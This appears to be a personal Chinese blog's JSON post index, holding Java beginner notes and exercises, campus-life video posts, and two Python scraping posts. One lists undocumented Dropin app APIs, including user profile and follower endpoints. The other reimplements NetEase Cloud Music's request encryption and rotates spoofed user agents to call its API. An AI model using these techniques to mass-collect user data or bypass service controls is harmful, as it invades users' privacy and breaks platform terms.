布尔类型1. 只允许取值 true 和 false。2. 通常在条件判断，循环结构中使用。6. Tip 变量必须先声明，后使用。 变量都定义在其作用域内。出了作用域，则失效。 同一个作用域内，不可以声明两个同名的变量。 三. 基本数据类型的运算规则1. 自动类型提升当容量小的数据类型的变量和容量大的做运算时，结果自动提升为容量大的byte , short , char -&gt; int -&gt; long -&gt; float -&gt; double当 byte , short , char 做运算时结果都是 int2. 强制类型转化（自动类型提升的逆运算）1. 需要使用强转符：（）2. 强制转化类型，可能有精度损失 被截断了 数据溢出","tags":["Java","学习笔记","基础","关键字","变量","基础数据类型"],"categories":["Java学习笔记"]},{"title":"java练习1","path":"//coding/java/exercise/1.html","content":"一.例题1.打印三角形效果： 代码：1234567891011public class triangle &#123; public static void main(String[] args)&#123; //public private for (int i = 0; i &lt; 5; i++)&#123; for (int j = 0; j &lt;= i; j++)&#123; System.out.print(&quot;*&quot;); &#125; System.out.println(); &#125; &#125;&#125; 结果：12345*************** 2.打印三角形 pro效果： 代码 1：在第一个的基础上另外循环一次，补出来下面的部分1234567891011121314151617public class trianglepro &#123; public static void main(String[] args)&#123; for (int i = 0; i &lt; 5; i++)&#123; for (int j = 0; j &lt;= i; j++)&#123; System.out.print(&quot;*&quot;); &#125; System.out.println(); &#125; for (int i = 4; i &gt; 0; i--)&#123; for (int j = 0; j &lt; i; j++)&#123; System.out.print(&quot;*&quot;); &#125; System.out.println(); &#125; &#125;&#125; 代码 2：使用绝对值（有点难）1234567891011public class trianglepro &#123; public static void main(String[] args)&#123; for (int i = 0; i &lt; 5*2-1; i++)&#123; //Math.abs（） 绝对值 for (int j = 0; j &lt; 5 - Math.abs(4-i); j++)&#123; System.out.print(&quot;*&quot;); &#125; System.out.println(); &#125; &#125;&#125; 结果：123456789************************* 3.打印三角形 promax效果： 代码：12345678910111213public class trianglepromax &#123; public static void main(String[] args)&#123; for (int i = 0; i &lt; 5*2-1; i++) &#123; for (int j = 0; j &lt; Math.abs(4-i); j++) &#123; System.out.print(&quot; &quot;); &#125; for (int j = 0; j &lt; (5-Math.abs(4-i))*2 - 1; j++) &#123; System.out.print(i%2); &#125; System.out.println(); &#125; &#125;&#125; 结果：12345678910 0 111 00000 1111111000000000 1111111 00000 111 0 4.打印三角形 promax 远峰蓝（很离谱）效果 代码：123456789101112131415161718192021222324252627282930313233343536import java.awt.*;import javax.swing.JLabel ;import javax.swing.JFrame ;public class TriangleProMaxSierraBlue &#123; public static void main(String args[])&#123; JFrame frame = new JFrame(&quot;TriangleProMaxSierraBlue&quot;) ; frame.setLayout(new FlowLayout()); String str=&quot;&quot;; for(int i=0;i&lt;5*2-1;i++)&#123; for(int j=0;j&lt;Math.abs(4-i);j++)&#123; str+=&quot; &quot;; &#125; for(int j=0;j&lt;(5-Math.abs(4-i))*2-1;j++)&#123; str+=i%2; &#125; //这里补齐了后面的空格 for(int j=0;j&lt;Math.abs(4-i);j++)&#123; str+=&quot; &quot;; &#125; JLabel lab = new JLabel(str,JLabel.CENTER) ; // 实例化标签对象 Font font = new Font(&quot;宋体&quot;, Font.PLAIN, 25); lab.setFont(font); lab.setForeground(new Color(173,198,220));; frame.add(lab) ; // 将组件件入到面板之中 str=&quot;&quot;; &#125; Dimension dim = new Dimension() ; dim.setSize(200,350) ; //窗体的大小 frame.setSize(dim) ; //设置窗体大小 Point point = new Point(500,100) ; // 设置坐标 frame.setLocation(point) ; //设置窗体坐标 frame.setVisible(true) ; //设置窗体可见 &#125;&#125; 结果：就是上面的图片，不再重复5.打印三角形（输入版）代码：1234567891011121314151617import java.util.Scanner;public class triangle_input &#123; public static void main(String[] args)&#123; //这里是输入 Scanner input = new Scanner(System.in); int num = input.nextInt(); for (int i = 0; i &lt; num; i++)&#123; for (int j = 0; j &lt; i + 1; j++)&#123; System.out.print(&quot;*&quot;); &#125; System.out.println(); &#125; &#125;&#125; 结果：123454********** 2.面试题（看不懂，一脸懵逼）题目：1234567891011121314151617181920/*有一个方阵，方阵中有男生0和女生1。一个女生上、下、左、右的女生与她本人同属于一朵&quot;花&quot;。方阵中有多少&quot;花&quot;？*/public class flowerNumber &#123; public static void main(String[] args)&#123; int[][] studentCube=&#123;&#123;0,0,1,1,1&#125;, &#123;1,0,1,0,0&#125;, &#123;1,1,1,0,1&#125;, &#123;0,0,0,0,0&#125;, &#123;1,1,0,1,1&#125;&#125;; System.out.print(&quot;Number of flowers is &quot;+solution(studentCube)); &#125; public static int solution(int[][] studentCube)&#123; int flowerNum=0; //输入内容 return flowerNum; &#125;&#125; 代码：（用到了迭代，看不懂啊）这个是彬酱的有关迭代的递归和迭代123456789101112131415161718192021222324252627282930313233343536373839404142public class flowerNumber &#123; public static void main(String[] args)&#123; int[][] studentCube=&#123;&#123;0,0,1,1,1&#125;, &#123;1,0,1,0,0&#125;, &#123;1,1,1,0,1&#125;, &#123;0,0,0,0,0&#125;, &#123;1,1,0,1,1&#125;&#125;; System.out.print(&quot;Number of flowers is &quot;+solution(studentCube)); &#125; public static int solution(int[][] studentCube)&#123; int flowerNum=0; for(int i=0;i&lt;5;i++)&#123; for(int j=0;j&lt;5;j++)&#123; if(studentCube[i][j]==0) continue; flowerNum++; tagFemaleToMale(studentCube,i,j); &#125; &#125; return flowerNum; &#125; public static void tagFemaleToMale(int[][] studentCube,int i,int j)&#123; studentCube[i][j]=0; if(i&lt;4)&#123; if(studentCube[i+1][j]==1) tagFemaleToMale(studentCube,i+1,j); &#125; if(j&lt;4)&#123; if(studentCube[i][j+1]==1) tagFemaleToMale(studentCube,i,j+1); &#125; if(i&gt;0)&#123; if(studentCube[i-1][j]==1) tagFemaleToMale(studentCube,i-1,j); &#125; if(j&gt;0)&#123; if(studentCube[i][j-1]==1) tagFemaleToMale(studentCube,i,j-1); &#125; &#125;&#125; 结果：1Number of flowers is 4 三.总结 要加快进度看视频啊，要来不及了 很多绝对值那里需要再看看 递归和迭代搞不懂，有机会就学","tags":["Java","基础","练习"],"categories":["Java练习"]},{"title":"java学习笔记1","path":"//coding/java/note/1.html","content":"一.软件开发时常见 DOS 命令12345678dir : 列出当前目录下的文件以及文件夹md : 创建目录rd : 删除目录cd : 进入指定目录cd.. : 退回到上一级目录cd\\: 退回到根目录del : 删除文件exit : 退出 dos 命令行 二.第一个程序编写（helloworld）12345public class helloworld &#123; public static void main(String[] args)&#123; System.out.println(&quot;hello, world!&quot;); &#125;&#125; 输出结果：hello, world! 三.java 程序进行 编译：javac + 程序名称.java 运行：java + 程序名称（注意大小写） 四.Java 注释1. 单行注释（和 C 一样）12345678public class helloworld &#123; public static void main(String[] args)&#123; //这个是程序入口 //args（arguments）参数名字，可以改变 //括号里面可以写成 String args[] 但是比较少见 System.out.println(&quot;hello, world!&quot;); //下一语句输出到控制台，先输出后换行 System.out.print(&quot;hello, world!&quot;); //这句话不换行 &#125;&#125; 2. 多行注释（和 C 一样）12345/*多行注释不可以嵌套使用这里是多行注释这里也是多行注释*/ 3. 文档注释 (java 特有)12345/**@author 指定java程序的作者@version 指定源文件的版本 这里可以写中文*/ 单行注释和多行注释 作用： 增强可读性 方便调试 特点：不参与编译。 文档注释 内容可以被 javadoc 解析，生成一套以网页文件形式体现的该程序的说明文档。 使用方法：javadoc -d mydoc(文件名) -author -version Helloworld.java(文件名）-encoding utf-8 只有文档注释可以被 javadoc 读取，单行注释和多行注释不行 五.Java api 文档介绍了如何使用 java 的类。 下载地址 : http://www.oracle.com/technetwork/java/javase/downloads/index.html 六.Tip 一个 java 文件里面可以有多个 class，但是最多只有一个类声明为 public。 要求声明为 public 的类的类名必须宇源文件名相同。 程序的入口是 main 方法，格式是固定的。 编译以后会生成 1 个或多个 class 文件，字节码文件的文件名要与 java 源文件中的类名一致。 每一行都以 ; 结束。","tags":["Java","学习笔记"],"categories":["Java学习笔记"]},{"title":"关于Typecho Blog","path":"//about/Typecho_Blog.html","content":"这里是 bandao 的 Typecho 个人主页啊，使用的 joe 主题（主要是最近正在学 java，用 markdown 做笔记，wordpress 原生不支持，就用 Typecho）此博客主要存放我的 java 我的 B 站主页：半岛的孤城我的大破站：半岛的孤城我的网盘：半岛的孤城"},{"title":"【Dropin】Dropin多频百科爬虫","path":"//coding/python/dropin_wiki.html","content":"多频百科 api：视频使用教程 例子：http://duopin_app_api.hearinmusic.com/app/ency/encyDetail?typeId=13&amp;dataId=3771234567891011121314151617181920# GET方法url = &#x27;http://duopin_app_api.hearinmusic.com/app/ency/encyDetail?&#x27;params = &#123; &#x27;typeId&#x27;:str(typeId), &#x27;dataId&#x27;:str(dataId)&#125;# typeId和中文对应的关系typeId_dict = &#123; &#x27;12&#x27;:&#x27;艺人&#x27;,#(最大10000+) &#x27;13&#x27;:&#x27;风格&#x27;,#(最大379) &#x27;14&#x27;:&#x27;厂牌&#x27;,#(最大1933) &#x27;15&#x27;:&#x27;场所&#x27;,#(最大40) &#x27;16&#x27;:&#x27;电音节&#x27;,#(最大200) &#x27;17&#x27;:&#x27;事件&#x27;,#(最大3) &#x27;11&#x27;:&#x27;其他&#x27;#(最大45)&#125;dataId的json放在了dataId_json文件夹中 爬虫主体在 wiki_main.py（获取多频百科的列表）和 wiki_detail.py（获取多频百科的某一词条的具体信息）中 spider.py 把两个结合，爬取全部的多频百科全部的内容 接口（都为 GET 方法）以下的 pageSize 为返回的内容数量，memberId 为用户的 id关注 api12api = &quot;http://duopin_app_api.hearinmusic.com/app/fans/idolList?&quot;params = &#123;&#x27;pageSize&#x27;:&#x27;20&#x27;, &#x27;isAsc&#x27;:&#x27;desc&#x27;, &#x27;pageNum&#x27;:&#x27;1&#x27;, &#x27;memberId&#x27;:&#x27;%s&#x27;&#125; 例子：http://duopin_app_api.hearinmusic.com/app/fans/idolList?pageSize=20&amp;isAsc=desc&amp;pageNum=1&amp;memberId=104 粉丝 api12api = &quot;http://duopin_app_api.hearinmusic.com/app/fans/fansList?&quot;params = &#123;&#x27;pageSize&#x27;:&#x27;20&#x27;, &#x27;isAsc&#x27;:&#x27;desc&#x27;, &#x27;pageNum&#x27;:&#x27;1&#x27;, &#x27;memberId&#x27;:&#x27;%s&#x27;&#125; 例子：http://duopin_app_api.hearinmusic.com/app/fans/fansList?pageSize=20&amp;isAsc=desc&amp;pageNum=1&amp;memberId=104 个人信息 api12api = &quot;http://duopin_app_api.hearinmusic.com/app/member/info?&quot;params = &#123;&#x27;memberId&#x27;:&#x27;%s&#x27;&#125; 例子：http://duopin_app_api.hearinmusic.com/app/member/info?memberId=104 查看个人发布 api12api = &quot;http://duopin_app_api.hearinmusic.com/app/article/list3?&quot;params = &#123;&#x27;pageSize&#x27;:&#x27;20&#x27;, &#x27;pageNum&#x27;:&#x27;1&#x27;, &#x27;memberId&#x27;:&#x27;%s&#x27;&#125; 例子：http://duopin_app_api.hearinmusic.com/app/article/list3?pageSize=20&amp;pageNum=1&amp;memberId=104 评论 api12api = &quot;http://duopin_app_api.hearinmusic.com/app/comment/list&gt;&quot;params = &#123;&#x27;memberId&#x27;:&#x27;%s&#x27;&#125; 例子：http://duopin_app_api.hearinmusic.com/app/comment/list?articleId=5915 以下的 id 为文章的 id信号(文章)url API12api = &quot;http://dropinapp.hearinmusic.com/#/signalDet?&quot;params = &#123;&#x27;id&#x27;:&#x27;%s&#x27;&#125; 例子：http://dropinapp.hearinmusic.com/#/signalDet?id=5915 信号(文章)分享 url12api = &quot;http://dropinapp.hearinmusic.com/#/signalShare?&quot;params = &#123;&#x27;id&#x27;:&#x27;%s&#x27;&#125; 例子：http://dropinapp.hearinmusic.com/#/signalShare?id=5915 信号(文章)api12api = &quot;http://duopin_app_api.hearinmusic.com/app/article/v1_0/detailWeb?&quot;params = &#123;&#x27;id&#x27;:&#x27;%s&#x27;&#125; 例子：http://duopin_app_api.hearinmusic.com/app/article/v1_0/detailWeb?id=5915 以下的 id 为频段的 id频段 info_api12api = &quot;http://duopin_app_api.hearinmusic.com/app/channel/detail?&quot;params = &#123;&#x27;id&#x27;:&#x27;%s&#x27;&#125; 例子：http://duopin_app_api.hearinmusic.com/app/channel/detail?&amp;id=976 以下的 orderType 为请求的类型，pageSize 为返回的内容数量，channelIds 为频段的 id频段 content_api12api = &quot;http://duopin_app_api.hearinmusic.com/app/article/list3?&quot;params = &#123;&#x27;orderType&#x27;:&#x27;CHANNEL_NEW&#x27;, &#x27;pageSize&#x27;:&#x27;20&#x27;, &#x27;channelIds&#x27;:&#x27;%s&#x27;, &#x27;pageNum&#x27;:&#x27;1&#x27;&#125; 例子：http://duopin_app_api.hearinmusic.com/app/article/list3?orderType=CHANNEL_NEW&amp;pageSize=20&amp;channelIds=976&amp;pageNum=1 首页 api12api = &quot;http://duopin_app_api.hearinmusic.com/app/article/list3?&quot;params = &#123;&#x27;orderType&#x27;:&#x27;HOME&#x27;, &#x27;pageSize&#x27;:&#x27;20&#x27;, &#x27;pageNum&#x27;:&#x27;1&#x27;&#125; 例子：http://duopin_app_api.hearinmusic.com/app/article/list3?orderType=HOME&amp;pageSize=20&amp;pageNum=1 研究所 api12api = &quot;http://duopin_app_api.hearinmusic.com/app/search/research&quot;# 无params 以下的 keyword 为关键字搜索 api12api = &quot;http://duopin_app_api.hearinmusic.com/app/search/searchAll?&quot;params = &#123;&#x27;keyword&#x27;:&#x27;avicii&#x27;&#125; 例子：http://duopin_app_api.hearinmusic.com/app/search/searchAll?keyword=avicii","tags":["python","爬虫","多频"],"categories":["python"]},{"title":"【网易云】网易云解参数（获取网易云歌词，获取评论同理）","path":"//coding/python/cloudmusic_encseckey.html","content":"真正日常使用只需要输入 4 行，修改两行，很简单原视频（p46-p52） 代码部分以下代码基于上面的视频：（视频内为获取网易云评论， 此代码也是）params_encSecKey.py 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576#视频参考：https://www.bilibili.com/video/BV1i54y1h75W?p=48import requestsimport randomimport jsonfrom Crypto.Cipher import AESfrom base64 import b64encodeclass Netease_params(object): def __init__(self, data): #字典要成字符串（json）再加密 self.data = data #服务于d的 self.e = &#x27;010001&#x27; self.f = &#x27;00e0b509f6259df8642dbc35662901477df22677ec152b5ff68ace615bb7b725152b3ab17a876aea8a5aa76d2e417629ec4ee341f56135fccf695280104e0312ecbda92557c93870114af6c9d05c4f7f0c3685b7a46bee255932575cce10b424d813cfe4875d3e82047b97ddef52741d546b8e289dc6935b3ece0462db0a22b8e7&#x27; self.g = &#x27;0CoJUm6Qyw8W8jud&#x27; self.i = &#x27;vlgPRPyGhwA6F4Sq&#x27; #手动固定的 =》网页是随机的 def set_user_agent(self): USER_AGENTS = [ &quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)&quot;, &quot;Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)&quot;, &quot;Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)&quot;, &quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)&quot;, &quot;Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6&quot;, &quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1&quot;, &quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0&quot;, &quot;Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5&quot; ] user_agent = random.choice(USER_AGENTS) return user_agent def get_encSecKey(self): return &quot;6ea19f618d09893013feb207e6953ab0d04831ccf86095147970745a825a0f3288ad0bfdb802ffd5876394599d179b65785e679b23ae38035d476872f5270c26f7e15f0e2de0da92ac7fdd1de6a965642a67707d3b204d48a3a3c66fe536c9e2056d2032c884d764cf419e8ce7bd245f56bde140deccbaed83995285ee66ccda&quot; #转换成16的倍数 def to_16(self, data): pad = 16 -len(data) % 16 data += chr(pad) * pad return data def enc_params(self, data, key): #加密过程 iv = &quot;0102030405060708&quot; data = self.to_16(data) #加密的内容必须是16的倍数 aes = AES.new(key=key.encode(&quot;utf-8&quot;), IV=iv.encode(&quot;utf-8&quot;), mode=AES.MODE_CBC) #创建加密器 bs = aes.encrypt(data.encode(&quot;utf-8&quot;)) #加密 return str(b64encode(bs), &quot;utf-8&quot;) #转成字符串，这个bs不能直接decode，要先转成b64 #数据加密两次 def get_params(self, data): first = self.enc_params(data, self.g) secend = self.enc_params(first, self.i) return secend def run(self, url): data = &#123; &#x27;params&#x27;: self.get_params(json.dumps(self.data)), &#x27;encSecKey&#x27;:self.get_encSecKey() &#125; headers = &#123;&#x27;User-Agent&#x27;:self.set_user_agent()&#125; response = requests.post(url, data=data, headers=headers).json() #print(response) return responseif __name__ == &#x27;__main__&#x27;: url = &#x27;https://music.163.com/weapi/song/lyric?csrf_token=&#x27; data = &#123; &#x27;csrf_token&#x27;: &quot;&quot;, &#x27;id&#x27;: &quot;1398764652&quot;, &#x27;lv&#x27;: &#x27;-1&#x27;, &#x27;tv&#x27;: &#x27;-1&#x27; &#125; wyy = Netease_params(data) wyy.run(url) 获取参数方法 此处为歌词的 data，csrf_token 可以空 获取网易云评论 打开任意一首歌曲（演示 ） 按 F12，找到响应内容为评论的请求此处的 url 就是后面要使用的 url 按顺序点击 格式化一下 在此处添加断点 按 F5 刷新 按”1“处，直到”2”处的链接为评论的请求 url（rid，threadId 最后面的数字为歌曲 id） 把方框内的拷贝到 data 里面，并修改为字典的格式（注意csrf_token 可以空，全部的内容都为字符串）Tip 其中 url 和 data 的获取过程请参考上面的步骤，如果看不懂，请参考最上方的视频 使用方法参考最下方的 if __name__ == &#39;__main__&#39; 部分，此处为四行， 只需要修改 url 和 data 就可以获取不同的信息","tags":["python","爬虫","网易云"],"categories":["python"]},{"title":"【西邮】大一那些事","path":"//life/goodbye_02202016.html","content":"我的大一一点小秘密：我不轻易告诉别人，我看了之后想哭标题点击后直接转跳 B 站 1.【西邮】经管院：冠军绝不是终点！ 2.【西邮·佛山三中】西邮灰 × 三中绿 3.【西邮】腾飞杯篮球赛混剪（经管 VS 自动化） 4.【西邮】青春与 Avicii 的碰撞! 5.【西邮】你有见过这么燃的校运会吗！ 6.It’s a good time when we are together（特别现场版） 7.【西邮】雁塔：这次应该真比招生减章好","tags":["西安邮电大学","雁塔校区"],"categories":["大学生活"]},{"title":"【西邮】校园有推播，生活更快乐","path":"//life/yanta_union.html","content":"西安邮电大学校学生会雁塔分会标题点击后直接转跳 B 站 1.【西邮】3v3 篮球混剪 2.【西邮】第一季融媒体大赛开场视频 3.【西邮】我们的回忆西邮学生会雁塔分会 2020 年第二次例会开场视频 4.【西邮】漫漫上学路西邮学生会雁塔分会 2021 年第一次例会开场视频 5.【西邮】快进来听歌！！！西邮第十六届“校园十佳歌手”复赛大赛开场视频 6.【西邮】学期总结西邮学生会雁塔分会 2020-2021 第二学期总结","tags":["西安邮电大学","雁塔校区","校学生会"],"categories":["大学生活"]},{"title":"【西邮】2021腾飞杯","path":"//life/xupt_2021tfb.html","content":"经济管理，无与伦比2021.3.31 经管 VS 邮政视频下载 2021.4.2 邮政 VS 通院视频下载 2021.4.7 经管 VS 通院视频下载 2021.4.9 经管 VS 自动化视频下载 2021.4.12 邮政 VS 理学院视频下载 2021.4.19 经管 VS 电院 女篮视频下载 2021.4.20 avicii·腾飞杯","tags":["西安邮电大学","经济与管理学院","篮球","腾飞杯","雁塔校区"],"categories":["大学生活"]},{"title":"【西邮】经济管理无与伦比","path":"//life/jjgl_nb.html","content":"西安邮电大学经济与管理学院学生会标题点击后直接转跳 B 站 1.【西安邮电大学】这里有雁塔的美景！！！西安邮电大学经济与管理学院学生会第一次例会开场视频 2.【西邮】经管院：冠军绝不是终点！西安邮电大学 2020 年西邮杯篮球赛决赛 3.【西邮】2020 年经管院学生会上学期一些有趣的事西安邮电大学经济与管理学院学生会第二次例会开场视频 4.【西邮】经济与管理学院广播体操预热 5.【西邮】我们创造过辉煌，也将继续辉煌（——致敬经管院学生会）西安邮电大学 2021 年经济与管理学院广播体操比赛 6.【西邮】你有见过这么燃的校运会吗！西安邮电大学第二十八届田径运动会经济与管理学院混剪 7.It’s a good time when we are together西安邮电大学经济与管理学院学生会第二次例会回顾视频 8.2020-2021 学年度总结回顾西安邮电大学经济与管理学院“时代青年展风华 传承精神谐新章”文艺汇演暨学年总结 学生会视频回顾原视频","tags":["西安邮电大学","经济与管理学院","院学生会"],"categories":["大学生活"]}]